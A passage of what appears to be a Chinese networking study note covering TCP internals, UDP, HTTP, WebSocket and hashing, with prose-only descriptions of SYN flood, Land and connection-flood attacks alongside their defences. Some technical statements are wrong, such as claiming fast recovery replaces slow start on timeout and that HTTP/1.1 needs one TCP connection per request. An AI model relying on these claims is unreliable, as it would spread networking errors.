<li><strong>窗口大小（Window Size，16位）</strong>：表示发送方当前可接收的数据量（以字节为单位）。</li>
<li><strong>校验和（Checksum，16位）</strong>：用于检测报文在传输过程中是否发生错误。</li>
<li><strong>紧急指针（Urgent Pointer，16位）</strong>：仅在URG标志位被设置时有效，表示紧急数据在报文中的偏移量。</li>
<li><strong>选项（Options，可选，长度可变）</strong>：包含了一些可选的TCP功能，如最大报文长度（MSS）、窗口扩大因子（Window Scale）和选择性确认（SACK）等。</li>
<li><strong>填充（Padding，可选，长度可变）</strong>：用于保证TCP首部的长度为32位字的整数倍。</li>
</ol>
<p>TCP报文首部后面的数据部分包含了实际要传输的数据。TCP通过将数据划分为多个报文并为每个报文分配一个唯一的序列号，实现了可靠的、面向连接的数据传输。</p>
<h2 id="TCP连接的状态"><a href="#TCP连接的状态" class="headerlink" title="TCP连接的状态"></a>TCP连接的状态</h2><p>TCP连接的建立、数据传输和断开过程涉及多种状态。以下是TCP连接状态的详细说明：</p>
<ol>
<li><strong>CLOSED</strong>：初始状态，表示没有建立连接，也没有活动的连接。</li>
<li><strong>LISTEN</strong>：服务器处于侦听状态，等待客户端发送连接请求。这是服务器主动打开的初始状态。</li>
<li><strong>SYN_SENT</strong>：客户端发送SYN报文后，进入SYN_SENT状态。这表示客户端已发送连接请求，等待服务器的回应。</li>
<li><strong>SYN_RECEIVED</strong>：服务器收到客户端的SYN报文后，发送自己的SYN报文和确认ACK报文，进入SYN_RECEIVED状态。这表示服务器已确认客户端的连接请求，等待客户端确认。</li>
<li><strong>ESTABLISHED</strong>：双方都收到并确认对方的SYN报文后，连接建立成功，进入ESTABLISHED状态。此时，双方可以开始数据传输。</li>
<li><strong>FIN_WAIT_1</strong>：当客户端完成数据传输并发送FIN报文后，进入FIN_WAIT_1状态。这表示客户端请求关闭连接，等待服务器的确认。</li>
<li><strong>FIN_WAIT_2</strong>：客户端收到服务器对FIN报文的确认ACK报文后，进入FIN_WAIT_2状态。此时，客户端等待服务器发送自己的FIN报文，表示服务器已完成数据传输。</li>
<li><strong>CLOSE_WAIT</strong>：服务器收到客户端的FIN报文后，进入CLOSE_WAIT状态。这表示服务器已确认客户端的关闭请求，但仍需等待服务器完成数据传输。</li>
<li><strong>CLOSING</strong>：当双方同时发送FIN报文时，客户端会在收到服务器的FIN报文前进入CLOSING状态。这表示双方都请求关闭连接，但客户端尚未收到服务器对其FIN报文的确认。</li>
<li><strong>LAST_ACK</strong>：服务器在发送FIN报文后，进入LAST_ACK状态。这表示服务器等待客户端对其FIN报文的确认。</li>
<li><strong>TIME_WAIT</strong>：客户端收到服务器的FIN报文并确认后，进入TIME_WAIT状态。客户端会在这个状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保服务器收到对其FIN报文的确认。之后，客户端进入CLOSED状态，关闭连接。</li>
<li><strong>CLOSED</strong>：连接已完全关闭，可以释放所有相关资源。</li>
</ol>
<p>这些状态描述了TCP连接的整个生命周期，包括连接建立、数据传输和连接关闭</p>
<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><h3 id="三次握手的过程"><a href="#三次握手的过程" class="headerlink" title="三次握手的过程"></a>三次握手的过程</h3><p>TCP三次握手（Three-Way Handshake）是建立TCP连接的过程，通过三次交换控制报文来确认双方的收发能力和同步双方的初始序列号。以下是TCP三次握手的详细步骤：</p>
<ol>
<li><p><strong>SYN</strong>：客户端发送一个TCP报文，其中SYN（Synchronize Sequence Numbers，同步序列号）标志位被设置为1，表示这是一个连接请求。客户端还会选择一个初始序列号x，并将其放入报文的序列号字段。</p>
</li>
<li><p><strong>SYN-ACK</strong>：服务器收到客户端的SYN报文后，会发送一个响应报文。在这个报文中，SYN标志位和ACK（Acknowledge，确认）标志位都被设置为1。服务器也会选择一个初始序列号y，并将其放入报文的序列号字段。同时，服务器会将客户端报文序列号x加1，并将结果放入报文的确认号字段，表示期望收到客户端下一个报文的序列号。</p>
</li>
<li><p><strong>ACK</strong>：客户端收到服务器的SYN-ACK报文后，会发送一个ACK报文。在这个报文中，ACK标志位被设置为1。客户端会将服务器报文的序列号y加1，并将结果放入报文的确认号字段，表示期望收到服务器下一个报文的序列号。至此，TCP三次握手完成，双方建立起了连接。</p>
</li>
</ol>
<p>在TCP三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号。</p>
<p>总之，TCP三次握手是建立TCP连接的过程，包括以下三个步骤：</p>
<ol>
<li>客户端发送SYN报文，请求连接，并设置初始序列号x。</li>
<li>服务器回复SYN-ACK报文，确认连接请求，设置初始序列号y，确认号为x+1。</li>
<li>客户端发送ACK报文，确认服务器的SYN-ACK，确认号为y+1。</li>
</ol>
<p>握手完成后，TCP连接建立，数据传输开始。</p>
<h3 id="三次而不是两次握手的原因"><a href="#三次而不是两次握手的原因" class="headerlink" title="三次而不是两次握手的原因"></a>三次而不是两次握手的原因</h3><p>TCP三次握手的主要目的是在不可靠的网络环境中实现可靠的连接建立。三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。这里详细说明为什么需要三次握手：</p>
<ol>
<li><p><strong>确认收发能力</strong>：通过三次握手，客户端和服务器可以确认对方的收发能力。首先，客户端发送SYN报文表示其具备发送能力；其次，服务器回复SYN-ACK报文表示其具备接收和发送能力；最后，客户端发送ACK报文表示其具备接收能力。这个过程确保了双方在连接建立后都能正常地收发数据。</p>
</li>
<li><p><strong>同步初始序列号</strong>：在TCP协议中，每个字节都有唯一的序列号。为了实现可靠的数据传输，客户端和服务器需要在建立连接时同步各自的初始序列号。在三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号，并在握手过程中交换这些序列号。这样，双方都能知道对方期望收到的第一个字节的序列号，从而为后续的数据传输做好准备。</p>
</li>
</ol>
<p>如果只进行两次握手，客户端和服务器之间的连接可能不可靠。例如，客户端发送SYN报文后，服务器回复SYN-ACK报文，但无法确认客户端是否具备接收能力。这可能导致服务器发送的数据无法被客户端正确接收，从而影响通信质量。因此，为了实现可靠的连接建立，TCP协议采用了三次握手的机制。</p>
<h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h3><p>SYN攻击（也称为TCP SYN泛洪攻击）是一种利用TCP协议三次握手机制进行的拒绝服务（DoS）攻击。攻击者向目标服务器发送大量伪造源IP地址的SYN报文，目的是消耗服务器的资源，使正常用户无法访问该服务器。以下是SYN攻击的详细过程：</p>
<ol>
<li>攻击者向目标服务器发送大量SYN报文，这些报文的源IP地址是伪造的。每个SYN报文都表示一个连接请求。</li>
<li>目标服务器收到SYN报文后，会为每个报文分配一个半连接（half-open connection），并回复SYN-ACK报文。由于源IP地址是伪造的，这些SYN-ACK报文无法到达真正的发送方。</li>
<li>目标服务器等待攻击者发送ACK报文以完成握手过程。然而，由于源IP地址是伪造的，ACK报文永远不会到达。目标服务器会在一定时间内保留这些半连接，直到超时。</li>
<li>攻击者持续发送大量伪造的SYN报文，导致目标服务器的资源耗尽，从而无法处理正常用户的连接请求。</li>
</ol>
<p>SYN攻击的危害在于它可以通过较少的资源（例如，较低的带宽和较少的报文）消耗大量服务器资源，从而实现拒绝服务的目的。防御SYN攻击的方法包括：</p>
<ol>
<li><strong>缩短超时时间</strong>：减少服务器等待ACK报文的时间，以便更快地释放半连接资源。</li>
<li><strong>增加半连接队列大小</strong>：增加服务器可以处理的半连接数量，以应对大量的SYN报文。</li>
<li><strong>SYN cookies</strong>：服务器在回复SYN-ACK报文时，使用一种称为SYN cookies的技术生成确认号，而不是分配半连接。当收到有效的ACK报文时，服务器可以通过确认号重新构建连接状态，从而避免为伪造的SYN报文分配资源。</li>
<li><strong>过滤伪造的IP地址</strong>：部署网络设备（例如防火墙和入侵检测系统）来识别并阻止伪造的IP地址，以减少SYN攻击的影响。</li>
</ol>
<p>尽管SYN攻击是一种比较古老的攻击方式，但它仍然具有一定的威胁。通过采用合适的防御措施，可以降低SYN攻击对服务器的影响。</p>
<h3 id="Land攻击"><a href="#Land攻击" class="headerlink" title="Land攻击"></a>Land攻击</h3><p>Land攻击是一种DoS（拒绝服务）攻击类型，这种攻击利用TCP&#x2F;IP协议的漏洞，通过发送伪造的数据包来使目标系统无法正常工作。Land攻击的特点是发送的数据包的源IP地址和目标IP地址相同，同时源端口和目标端口也相同。</p>
<p>Land攻击的过程如下：</p>
<ol>
<li>攻击者构造一个伪造的TCP数据包，将源IP地址和目标IP地址设置为目标系统的IP地址，同时将源端口和目标端口设置为相同的端口号。</li>
<li>攻击者发送这个伪造的数据包到目标系统。</li>
<li>目标系统在收到这个数据包后，由于源IP地址和目标IP地址相同，尝试与自身建立连接。这会导致目标系统的资源消耗，进而可能导致系统崩溃或无法响应其他合法请求。</li>
</ol>
<p>Land攻击在20世纪90年代是一种较为常见的攻击手段，但现在大部分操作系统和网络设备已经修复了相关漏洞，不再受此类攻击影响。然而，为了防止潜在的Land攻击，可以采取以下措施：</p>
<ol>
<li>更新操作系统和网络设备的软件，确保已修复相关漏洞。</li>
<li>配置防火墙和入侵检测系统（IDS）来识别并过滤伪造的数据包。</li>
<li>监控网络流量，以检测异常数据包和潜在的攻击行为。</li>
</ol>
<h3 id="Connection-Flood攻击"><a href="#Connection-Flood攻击" class="headerlink" title="Connection Flood攻击"></a>Connection Flood攻击</h3><p>Connection Flood攻击是一种拒绝服务（DoS）攻击类型，其主要目标是消耗目标服务器的连接资源，使其无法处理新的合法连接请求。这种攻击方法通常通过发送大量的连接请求或半打开的连接来实现。</p>
<p>在Connection Flood攻击中，攻击者通常采取以下步骤：</p>
<ol>
<li>攻击者向目标服务器发送大量的连接请求，可能使用合法或伪造的IP地址。</li>
<li>目标服务器在收到连接请求后，尝试为每个请求分配资源，以处理并维护这些连接。</li>
<li>随着连接数量的增加，目标服务器的资源逐渐耗尽，导致无法处理新的合法连接请求。</li>
</ol>
<p>Connection Flood攻击可能针对不同的协议和服务，例如HTTP连接泛洪、TCP连接泛洪或TLS&#x2F;SSL连接泛洪。</p>
<p>为了防御Connection Flood攻击，可以采取以下措施：</p>
<ol>
<li><strong>限制连接速率</strong>：为单个IP地址或子网设置连接速率限制，以防止攻击者短时间内发送大量连接请求。</li>
<li><strong>连接队列管理</strong>：优化连接队列策略，例如缩短超时时间、增加队列大小等，以提高服务器处理连接请求的能力。</li>
<li><strong>入侵检测和防御系统</strong>：部署入侵检测和防御系统（IDPS），以实时监测并阻止Connection Flood攻击。</li>
<li><strong>负载均衡</strong>：通过负载均衡技术将连接请求分发到多个服务器，以减轻单个服务器的压力，并提高整体服务的抗攻击能力。</li>
<li><strong>IP地址过滤</strong>：使用防火墙或其他安全设备过滤来自可疑或恶意IP地址的连接请求。</li>
<li><strong>应用层防御</strong>：针对特定服务或协议的攻击，例如HTTP或TLS&#x2F;SSL连接泛洪，可以使用Web应用防火墙（WAF）或其他应用层防御技术进行防护。</li>
</ol>
<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><h3 id="四次挥手的过程"><a href="#四次挥手的过程" class="headerlink" title="四次挥手的过程"></a>四次挥手的过程</h3><p>TCP四次挥手是TCP连接在传输完成后进行断开的过程。TCP（传输控制协议）是一种面向连接的协议，因此在数据传输完成后，需要通过一个四步过程来正常关闭连接。以下是TCP四次挥手的详细步骤：</p>
<ol>
<li><p><strong>第一次挥手</strong>：客户端向服务器发送一个FIN报文，表示客户端已经完成数据传输，请求关闭连接。此时，客户端进入FIN_WAIT_1状态。</p>
</li>
<li><p><strong>第二次挥手</strong>：服务器收到客户端发送的FIN报文后，会发送一个ACK报文确认客户端的FIN报文已收到。此时，服务器进入CLOSE_WAIT状态，而客户端收到ACK报文后进入FIN_WAIT_2状态。</p>
</li>
<li><p><strong>第三次挥手</strong>：当服务器完成数据传输后，也会向客户端发送一个FIN报文，表示服务器同意关闭连接。此时，服务器进入LAST_ACK状态。</p>
</li>
<li><p><strong>第四次挥手</strong>：客户端在收到服务器的 FIN 报文后，发送 ACK 报文确认并进入 TIME_WAIT 状态。服务器收到 ACK 报文后，立即关闭连接。2 倍 MSL（约 2 分钟）后，客户端关闭连接。</p>
</li>
</ol>
<h3 id="要有TIME-WAIT状态的原因"><a href="#要有TIME-WAIT状态的原因" class="headerlink" title="要有TIME_WAIT状态的原因"></a>要有TIME_WAIT状态的原因</h3><p> TIME_WAIT状态存在于TCP连接关闭过程中，具有几个重要的原因：</p>
<ol>
<li><p><strong>确保最后一个ACK报文被对方接收</strong>：在TCP四次挥手过程中，客户端发送最后一个ACK报文确认收到服务器的FIN报文。TIME_WAIT状态确保了这个ACK报文能够被服务器正确接收。如果服务器没有收到这个确认报文，它会重发FIN报文。此时，由于客户端仍处于TIME_WAIT状态，可以再次发送ACK报文进行确认。</p>
</li>
<li><p><strong>处理延迟的数据包</strong>：在TIME_WAIT状态期间，客户端可以处理可能延迟到达的数据包。这有助于确保连接关闭前的所有数据包都被正确处理，防止数据丢失或错误。</p>
</li>
<li><p><strong>防止旧连接数据包干扰新连接</strong>：TCP连接由源IP、目标IP、源端口和目标端口四元组唯一确定。在某些情况下，相同的四元组可能在短时间内被重新用于新的连接。TIME_WAIT状态可以防止旧连接中仍在网络中传输的数据包干扰新连接。客户端在TIME_WAIT状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保旧连接的数据包从网络中消失。</p>
</li>
</ol>
<p>总之，TIME_WAIT状态在TCP连接关闭过程中发挥了重要作用，它确保了最后一个ACK报文被接收、处理延迟数据包和防止旧连接数据包干扰新连接。这有助于维护TCP连接的可靠性和数据传输的完整性。</p>
<h3 id="关闭连接的需要四次挥手，而建立连接只要三次握手的原因"><a href="#关闭连接的需要四次挥手，而建立连接只要三次握手的原因" class="headerlink" title="关闭连接的需要四次挥手，而建立连接只要三次握手的原因"></a>关闭连接的需要四次挥手，而建立连接只要三次握手的原因</h3><p>三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。确认过程中间有一个合并的SYN和ACK，所以是三步。</p>
<p>关闭连接需要四次挥手，因为 TCP 是全双工的，双方需要独立地确认对方已经完成数据发送，服务端收到SYN时可能还不能关闭连接，不能合并ACK和FIN，所以是四步。</p>
<h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><h3 id="滑动窗口机制"><a href="#滑动窗口机制" class="headerlink" title="滑动窗口机制"></a>滑动窗口机制</h3><p>TCP协议使用以字节为单位的滑动窗口协议来控制字节流的发送</p>
<p> 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口前部的字节已经发送并且收到了确认，那么就将发送窗口向后滑动一定距离，直到第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口前部字节为已经接收到的字节，收到数据并发送确认后，就向后滑动接收窗口，直到接收窗口为0。  </p>
<h3 id="确认重传机制"><a href="#确认重传机制" class="headerlink" title="确认重传机制"></a>确认重传机制</h3><p>在TCP中，选择性重传的实现原理主要依赖于选择性确认（Selective Acknowledgment, SACK）机制。SACK是一种TCP扩展，其目的是改进TCP在数据包丢失的情况下的性能。它允许接收方在确认报文中指定已成功接收的不连续数据段，从而使发送方可以更精确地了解哪些报文段需要重传。</p>
<p>SACK是通过在TCP报文头部添加选项字段来实现的。以下是SACK实现的主要步骤：</p>
<ol>
<li>协商SACK：在TCP连接建立过程中，双方通过在SYN和SYN-ACK报文中包含SACK-permitted选项来表示支持SACK。</li>
<li>接收数据并生成SACK块：接收方在接收数据时，记录每个已成功接收的数据段的左边界和右边界，并按照顺序排列。接收方在发送确认报文（ACK）时，会在TCP头部选项字段中加入SACK选项。SACK选项包含一个或多个SACK块，每个SACK块表示一个已成功接收的不连续数据段范围（左边界和右边界）。</li>
<li>处理SACK报文并重传数据：发送方在收到包含SACK选项的确认报文后，会根据其中的信息判断哪些报文段需要重传。发送方只需要重传那些未被确认的报文段，而已成功接收的数据段不会被重传。</li>
</ol>
<h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>TCP维护了一个拥塞窗口（cwnd，congestion window），窗口大小是发送端可以往网络发送的不会产生网络阻塞的字节数</p>
<h3 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h3><h4 id="慢启动算法"><a href="#慢启动算法" class="headerlink" title="慢启动算法"></a><strong>慢启动算法</strong></h4><p>慢启动用于在TCP连接开始时cwnd从初始值1逐渐（指数级）增加数据发送速率和传输窗口大小。发送端为连接维护了一个慢启动阈值（ssthread，slow start thread），一旦慢启动超过了慢启动阈值，TCP就从慢启动切换到拥塞避免算法（线性增加）</p>
<ul>
<li>当cwnd &lt; ssthread，使用慢启动算法</li>
<li>当cwnd &gt; ssthread，使用拥塞避免算法</li>
<li>当cwnd &#x3D; ssthread，既可以使用慢启动算法，也可以使用拥塞避免算法</li>
</ul>
<h4 id="拥塞避免算法"><a href="#拥塞避免算法" class="headerlink" title="拥塞避免算法"></a>拥塞避免算法</h4><p>拥塞避免算法的思路是让cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1</p>
<h4 id="快速恢复算法"><a href="#快速恢复算法" class="headerlink" title="快速恢复算法"></a><strong>快速恢复算法</strong></h4><p>如果发送方接收到3个或3个以上的重复确认时，就认为网络出现了拥塞，此时将启用快速恢复算法</p>
<p>当发生超时，不是进行慢启动，而是进行快速恢复，先将ssthread设为cwnd&#x2F;2，再将cwnd设为ssthread，然后执行拥塞避免算法</p>
<h4 id="快速重传算法"><a href="#快速重传算法" class="headerlink" title="快速重传算法"></a><strong>快速重传算法</strong></h4><p>如果发送方接收到3个或3个以上的重复确认（duplicate ACK）时，就认为前面发送的数据包已经丢失，立即重传这些数据包而不是等待超时重传，但是在重传之前会先执行快速恢复算法，以减轻网络拥塞</p>
<h2 id="粘包、拆包"><a href="#粘包、拆包" class="headerlink" title="粘包、拆包"></a>粘包、拆包</h2><p>TCP粘包和拆包是指在TCP传输过程中，发送方发送的多个小数据包被接收方合并成一个大数据包（粘包），或者一个大数据包被接收方拆分成多个小数据包（拆包）的现象。</p>
<p>造成TCP粘包和拆包的主要原因是TCP协议是面向流的，发送方和接收方之间没有明显的分界点，数据以字节流的形式进行传输。这就导致了发送方发送的多个小数据包可能会在接收方端被合并成一个大数据包，或者一个大数据包在传输过程中被拆分成多个小数据包。</p>
<p>为了避免TCP粘包和拆包现象，通常需要进行数据分包和数据拆包处理。数据分包是将待发送的数据按照固定大小的数据块进行分割，以便接收方能够正确接收数据。数据拆包则是将接收到的大数据包拆分成多个小数据包，以便上层应用程序能够正确处理数据。</p>
<p>常用的TCP粘包和拆包处理方式包括：</p>
<ol>
<li><p>固定长度分包：将数据按照固定长度进行分包，接收方按照相同的长度进行接收和处理。</p>
</li>
<li><p>在数据包头部增加数据长度信息：将数据长度信息添加到数据包头部，接收方根据长度信息进行接收和处理。</p>
</li>
<li><p>使用分隔符分包：将不同数据块之间加上特定的分隔符进行分包。</p>
</li>
<li><p>消息头+消息体：在消息头中增加消息体长度字段，接收方先接收消息头中的消息体长度字段，然后根据长度信息接收和处理数据</p>
</li>
</ol>
<p>通过这些处理方式，可以有效避免TCP粘包和拆包现象，保证数据传输的正确性和完整性。</p>
<h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><p>UDP（User Datagram Protocol）是一种无连接、不可靠的传输层协议，它以尽可能少的开销提供了一种面向事务的简单传输服务。相比于TCP协议，UDP协议不具备可靠性和流量控制机制，但是它具有传输速度快、数据包大小灵活等优势，在实时应用场景中得到广泛应用。</p>
<p>UDP协议的主要特点如下：</p>
<ol>
<li>无连接：UDP协议不需要进行连接建立和释放操作，直接向目标主机发送数据包即可，因此传输效率较高。</li>
<li>面向报文：UDP协议对应用层传递的报文既不合并也不拆分，以数据包为单位进行传输。</li>
<li>无流量控制：UDP协议不具备流量控制机制，发送方按照自己的速度发送数据包，而不考虑接收方的接收能力。</li>
<li>无拥塞控制：发送方可以按照自己的速度发送数据包，不会对网络拥塞状况进行检测。</li>
<li>无重传机制：在UDP协议中，如果某个数据包在传输过程中丢失或损坏，UDP协议不会进行重传，也不会通知发送方，是不可靠的。</li>
</ol>
<p>UDP协议在实时应用场景中得到广泛应用，如视频、语音、游戏等实时性要求较高的应用。由于UDP协议具有传输速度快、数据包大小灵活等优势，能够满足实时应用的要求，并且由于无连接、无可靠性等特点，使得实现简单，成本低廉。但是，也由于UDP协议不具备可靠性和流量控制机制，因此在需要数据传输的可靠性和稳定性的应用场景中，如文件传输、邮件等，通常使用TCP协议来保证传输的可靠性。</p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>HTTP是明文传输的、无状态的（关闭后客户端和服务端都不会保留任何上一次连接的信息）</p>
<h2 id="短连接"><a href="#短连接" class="headerlink" title="短连接"></a>短连接</h2><p>短连接的特点：</p>
<ul>
<li>是HTTP&#x2F;1.0的默认方式，每次请求都需要重新建立连接，可能导致较高的开销。</li>
<li>由于连接频繁建立和关闭，服务器可能需要处理大量的连接请求。</li>
</ul>
<p>短连接的适用场景：</p>
<ul>
<li>不需要长时间维持连接的场景。</li>
<li>低频率请求</li>
</ul>
<h2 id="长连接"><a href="#长连接" class="headerlink" title="长连接"></a>长连接</h2><p>长连接的特点：</p>
<ul>
<li>是HTTP&#x2F;1.1的默认方式，允许客户端在一个连接上发送多个请求，而不必每次都重新建立连接。</li>
<li>减少了重新建立连接的开销</li>
<li>长连接可能会占用服务器资源，因为连接在使用完后不会立即关闭。</li>
</ul>
<p>长连接的适用场景：</p>
<ul>
<li>需要长时间维持连接的场景，如实时应用和高频通信。</li>
<li>高频率请求</li>
</ul>
<h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><p>在HTTP&#x2F;1.1中，每个请求和响应都需要单独的TCP连接。虽然HTTP&#x2F;1.1引入了长连接来减少连接开销，但在每个连接上仍然只能同时处理一个请求。这可能导致队头阻塞问题，即较慢的请求阻塞后续请求的处理。HTTP&#x2F;2通过多路复用解决了这个问题。</p>
<p>多路复用的特点：</p>
<ul>
<li>允许在单个TCP连接上同时发送和接收多个请求和响应</li>
</ul>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>HTTP 状态码（HTTP Status Codes）是服务器用于表示客户端请求结果的三位数字。状态码分为五类，各类状态码的含义如下：</p>
<p>1xx（信息响应）：请求已接收，继续处理。</p>
<p>2xx（成功）：请求已成功接收、理解和接受。</p>
<p>3xx（重定向）：需要后续操作才能完成请求。</p>
<p>4xx（客户端错误）：请求包含错误语法或无法完成。</p>
<p>5xx（服务器错误）：服务器在处理请求时发生错误。</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>100</td>
<td>Continue: 请求已接收，继续处理。</td>
</tr>
<tr>
<td>200</td>
<td>OK: 请求成功，服务器已经处理了请求并返回了所需数据。</td>
</tr>
<tr>
<td>201</td>
<td>Created: 请求成功并已创建了新资源。</td>
</tr>
<tr>
<td>202</td>
<td>Accepted: 请求已被接受，但尚未处理。</td>
</tr>
<tr>
<td>204</td>
<td>No Content: 请求成功，但无需返回任何内容。</td>
</tr>
<tr>
<td>300</td>
<td>Multiple Choices: 请求的资源有多个表示。</td>
</tr>
<tr>
<td>301</td>
<td>Moved Permanently: 请求的资源已被永久移动到新的 URL。</td>
</tr>
<tr>
<td>302</td>
<td>Found: 请求的资源临时移动到新的 URL。</td>
</tr>
<tr>
<td>303</td>
<td>See Other: 对于 POST 请求，资源的响应可以在另一个 URL 上找到。</td>
</tr>
<tr>
<td>304</td>
<td>Not Modified: 资源自上次请求以来未发生更改。</td>
</tr>
<tr>
<td>307</td>
<td>Temporary Redirect: 请求的资源临时移动到新的 URL。</td>
</tr>
<tr>
<td>308</td>
<td>Permanent Redirect: 请求的资源已被永久移动到新的 URL。</td>
</tr>
<tr>
<td>400</td>
<td>Bad Request: 请求格式错误或服务器无法理解请求。</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized: 请求需要认证。客户端应提供认证信息。</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden: 客户端没有权限访问所请求的资源。</td>
</tr>
<tr>
<td>404</td>
<td>Not Found: 服务器找不到请求的资源。</td>
</tr>
<tr>
<td>405</td>
<td>Method Not Allowed: 请求方法（GET、POST 等）对于所请求的资源不允许。</td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error: 服务器在处理请求时遇到内部错误。</td>
</tr>
<tr>
<td>501</td>
<td>Not Implemented: 服务器不支持请求所需要的功能。</td>
</tr>
<tr>
<td>502</td>
<td>Bad Gateway: 作为网关或代理角色的服务器从上游服务器接收到无效响应。</td>
</tr>
<tr>
<td>503</td>
<td>Service Unavailable: 服务器暂时无法处理请求（由于过载或维护）。</td>
</tr>
<tr>
<td>504</td>
<td>Gateway Timeout: 作为网关或代理角色的服务器未及时从上游服务器收到请求。</td>
</tr>
</tbody></table>
<h1 id="WebSockets"><a href="#WebSockets" class="headerlink" title="WebSockets"></a>WebSockets</h1><p>WebSocket是一种通信协议，它在单个TCP连接上提供了全双工通信，允许客户端和服务器同时发送和接收消息。。WebSocket协议旨在解决HTTP协议在实时通信场景中的局限性，如低延迟和服务器主动推送消息等。</p>
<p>WebSocket协议的主要特点如下：</p>
<ol>
<li><p>全双工通信：WebSocket允许客户端和服务器在同一时间通过一个连接进行双向通信，而不是像HTTP那样的请求-响应模式。这使得数据传输更加高效，延迟更低。</p>
</li>
<li><p>低延迟：由于WebSocket建立在一个持久的TCP连接上，并减少了传输数据所需的开销，因此在实时应用中具有更低的延迟。</p>
</li>
<li><p>服务器推送：WebSocket允许服务器主动向客户端推送消息，而无需客户端明确请求。这对于实时通知、聊天应用、在线游戏等场景非常有用。</p>
</li>
<li><p>兼容性：WebSocket协议在设计时考虑了与HTTP协议的兼容性，使用HTTP升级请求将普通的HTTP连接升级为WebSocket连接。这意味着WebSocket可以利用现有的HTTP基础设施，如代理服务器和负载均衡器。</p>
</li>
</ol>
<p>WebSocket的一些常见应用场景包括：</p>
<ul>
<li>实时消息传递和聊天应用</li>
<li>在线游戏</li>
<li>实时数据推送和更新，如股票行情、体育比分等</li>
<li>即时协作工具，如在线文档编辑、共享白板等</li>
<li>物联网（IoT）设备间的通信</li>
</ul>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p>哈希算法（Hash algorithm）是密码学领域中的一种重要技术，它将任意长度的输入数据（通常称为消息）映射到固定长度的输出（通常称为哈希值、摘要或指纹）。哈希算法具有许多实际应用，如数据完整性验证、消息认证、数字签名以及密码存储等。</p>
<p>一个优秀的哈希算法应具有以下特性：</p>
<ol>
<li>确定性：对于相同的输入，哈希算法总是产生相同的输出。</li>
<li>高效性：哈希算法应能快速地计算出输入数据的哈希值。</li>
<li>单向性（预映像抗性）：给定一个哈希值，计算出原始输入数据应是非常困难的。</li>
<li>二次预映像抗性：给定一个输入数据，找到另一个不同的输入，使其具有相同的哈希值，应该是非常困难的。</li>
<li>抗碰撞性：找到任意两个不同的输入，它们具有相同的哈希值，应该是非常困难的。</li>
<li>随机性：哈希值的输出应该看起来是随机的，即使对于相似的输入，它们的哈希值也应该有很大差异。</li>
</ol>
<p>在密码学中，常用的哈希算法有：</p>
<ol>
<li>MD5（Message Digest Algorithm 5）：MD5是一种广泛使用的哈希算法，产生128位（16字节）的哈希值。然而，由于已知的安全漏洞，如碰撞攻击，MD5不再被认为是安全的哈希算法。</li>
<li>SHA-1（Secure Hash Algorithm 1）：SHA-1是一种哈希算法，产生160位（20字节）的哈希值。与MD5类似，由于已知的安全漏洞，如碰撞攻击，SHA-1也不再被认为是安全的哈希算法。</li>
<li>SHA-2（Secure Hash Algorithm 2）：SHA-2是一种哈希算法族，包括SHA-256、SHA-512等，分别产生不同长度的哈希值（256bit、512bit等），比SHA-1和MD5更安全，是目前安全的、推荐使用的Hash算法。</li>
<li>SHA-3（Secure Hash Algorithm 3）：SHA-3是一种新的哈希算法族，包括SHA3-256、SHA3-512等。是安全的。</li>
</ol>
<h2 id="碰撞攻击"><a href="#碰撞攻击" class="headerlink" title="碰撞攻击"></a>碰撞攻击</h2><p>碰撞攻击（Collision attack）是一种针对哈希算法的攻击方法，其目标是找到两个不同的输入数据，它们具有相同的哈希值。理论上，一个理想的哈希函数应具有较高的抗碰撞性，即使计算能力非常强大，也应该很难找到具有相同哈希值的两个不同输入。</p>
<p>然而，在实际中，许多哈希算法（如MD5和SHA-1）已经被证明存在碰撞攻击的漏洞。这些漏洞使攻击者能够在相对较短的时间内找到具有相同哈希值的不同输入，从而破坏哈希算法的安全性。</p>
<p>碰撞攻击的成功可能导致以下安全问题：</p>
<ol>
<li>伪造数字签名：如果攻击者能够找到两个具有相同哈希值的不同文档，他们可以使一个文档的有效数字签名适用于另一个文档，从而实现伪造。</li>
<li>证书颁发伪造：攻击者可以利用碰撞攻击创建具有相同哈希值的伪造证书，从而破坏SSL&#x2F;TLS等安全通信协议的信任基础。</li>
<li>数据完整性损害：哈希函数通常用于检查数据的完整性，如下载文件的校验。如果攻击者能够创建具有相同哈希值的恶意文件，用户可能会在不知情的情况下下载和使用这些文件。</li>
</ol>
